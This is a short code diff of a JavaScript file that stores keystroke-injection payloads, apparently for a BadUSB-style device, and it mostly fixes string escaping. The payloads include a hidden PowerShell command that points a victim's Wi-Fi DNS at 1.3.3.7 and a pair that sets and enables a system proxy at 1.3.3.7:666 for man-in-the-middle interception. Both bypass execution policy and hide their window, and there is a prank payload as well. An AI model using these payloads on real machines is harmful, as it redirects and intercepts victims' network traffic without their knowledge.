@@ -465,7 +465,7 @@ ENTER
 DELAY 500
 GUI UPARROW
 DELAY 500
-STRING RICK ROLL NOTEPADZZZ
+STRING RICK ROLL NOTEPADZZZ`;
 
 const dnsP = `GUI r
 DELAY 100
@@ -476,14 +476,14 @@ DELAY 100
 SSTRING powershell -W Hidden -EP Bypass -NoP Set-DnsClientServerAddress -InterfaceAlias 'Wi-Fi' -ServerAddresses ('1.3.3.7', '1.2.3.4')
 DELAY 100
 ENTER`;
-         
+
 const mitmP = `GUI r
 DELAY 100
-STRING powershell -W Hidden -EP Bypass -NoP Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ProxyServer '1.3.3.7:666'
+STRING powershell -W Hidden -EP Bypass -NoP Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyServer '1.3.3.7:666'
 DELAY 100
 ENTER
 DELAY 200
-STRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name ProxyEnable '1'
+STRING powershell -W hidden -ExecutionPolicy Bypass -NoProfile Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable '1'
 DELAY 100
 ENTER`;
          
